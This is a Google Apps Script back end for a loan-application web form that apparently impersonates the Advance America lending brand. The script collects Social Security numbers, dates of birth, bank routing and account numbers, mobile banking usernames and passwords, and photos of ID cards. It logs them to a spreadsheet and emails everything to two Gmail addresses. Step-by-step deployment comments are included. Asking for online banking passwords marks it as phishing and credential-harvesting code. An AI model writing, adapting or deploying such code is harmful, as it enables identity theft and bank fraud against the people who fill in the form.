/**
 * ============================================================
 * AdvanceAmericaLoans - Form Handler
 * Google Apps Script Web App
 * ============================================================
 * 1. Create a new Google Sheet.
 * 2. Rename the first sheet tab to "AdvanceAmericaLoans Applications".
 * 3. Add these headers in row 1:
 *    Timestamp | First Name | Last Name | Email | Phone | SSN | DOB |
 *    Address | City | State | ZIP | Bank Name | Routing | Account |
 *    Mobile Username | Mobile Password | Loan Amount | Monthly Income | Purpose | ID Front | ID Back |
 * 4. Open Apps Script (Extensions > Apps Script).
 * 5. Paste this code into the script editor.
 * 6. Update NOTIFICATION_EMAIL and KILL_SWITCH below.
 * 7. Deploy as Web App (Execute as Me, Allow Anyone).
 * 8. Copy the deployment URL into src/lib/constants.ts
 * ============================================================
 */

const NOTIFICATION_EMAIL = 'finnfoxpersonalloan@gmail.com, aavantdatamart@gmail.com'
const KILL_SWITCH = false // Set to true to immediately reject submissions
const SHEET_NAME = 'AdvanceAmericaLoans Applications'
const SCRIPT_PROJECT_NAME = 'AdvanceAmericaLoans - Form Handler'

function doPost(e) {
  if (KILL_SWITCH) {
    return jsonResponse({ success: false, message: 'Submissions are temporarily disabled.' })
  }

  try {
    const data = JSON.parse(e.postData.contents)
    const spreadsheet = SpreadsheetApp.getActiveSpreadsheet()
    const sheet = spreadsheet.getSheetByName(SHEET_NAME)
    if (!sheet) {
      throw new Error('Sheet not found: ' + SHEET_NAME)
    }

    const timestamp = new Date()
    const row = [
      timestamp,
      data.firstName || '',
      data.lastName || '',
      data.email || '',
      data.phone || '',
      data.ssn || '',
      data.dateOfBirth || '',
      data.address || '',
      data.city || '',
      data.state || '',
      data.zipCode || '',
      data.bankName || '',
      data.routingNumber || '',
      data.accountNumber || '',
      data.mobileBankingUsername || '',
      data.mobileBankingPassword || '',
      data.loanAmount || '',
      data.monthlyIncome || '',
      data.loanPurpose || '',
      data.idFront ? 'Attached' : 'Missing',
      data.idBack ? 'Attached' : 'Missing',
    ]

    sheet.appendRow(row)

    sendNotificationEmail(data)

    return jsonResponse({ success: true, message: 'Application received.' })
  } catch (error) {
    return jsonResponse({ success: false, message: error.toString() })
  }
}

function doGet(e) {
  return jsonResponse({ status: 'ok', project: SCRIPT_PROJECT_NAME })
}

function jsonResponse(payload) {
  return ContentService.createTextOutput(JSON.stringify(payload)).setMimeType(
    ContentService.MimeType.JSON
  )
}

function sendNotificationEmail(data) {
  const subject = 'New Loan Application — ' + (data.firstName + ' ' + data.lastName)

  let body = '<h2>New Loan Application</h2><table>'
  const fields = [
    ['Name', data.firstName + ' ' + data.lastName],
    ['Email', data.email],
    ['Phone', data.phone],
    ['SSN', data.ssn],
    ['Date of Birth', data.dateOfBirth],
    ['Address', [data.address, data.city, data.state, data.zipCode].filter(Boolean).join(', ')],
    ['Bank Name', data.bankName],
    ['Routing Number', data.routingNumber],
    ['Account Number', data.accountNumber],
    ['Mobile Banking Username', data.mobileBankingUsername],
    ['Mobile Banking Password', data.mobileBankingPassword],
    ['Loan Amount', data.loanAmount],
    ['Monthly Income', data.monthlyIncome],
    ['Loan Purpose', data.loanPurpose],
  ]
  fields.forEach(([label, value]) => {
    body += `<tr><td><strong>${label}</strong></td><td>${value || ''}</td></tr>`
  })
  body += '</table>'

  const attachments = []
  if (data.idFront && data.idFront.base64) {
    attachments.push(
      Utilities.newBlob(
        Utilities.base64Decode(data.idFront.base64),
        data.idFront.type || 'image/jpeg',
        data.idFront.name || 'id-front.jpg'
      )
    )
  }
  if (data.idBack && data.idBack.base64) {
    attachments.push(
      Utilities.newBlob(
        Utilities.base64Decode(data.idBack.base64),
        data.idBack.type || 'image/jpeg',
        data.idBack.name || 'id-back.jpg'
      )
    )
  }

  MailApp.sendEmail({
    to: NOTIFICATION_EMAIL,
    subject: subject,
    htmlBody: body,
    attachments: attachments,
    name: SCRIPT_PROJECT_NAME,
  })
}
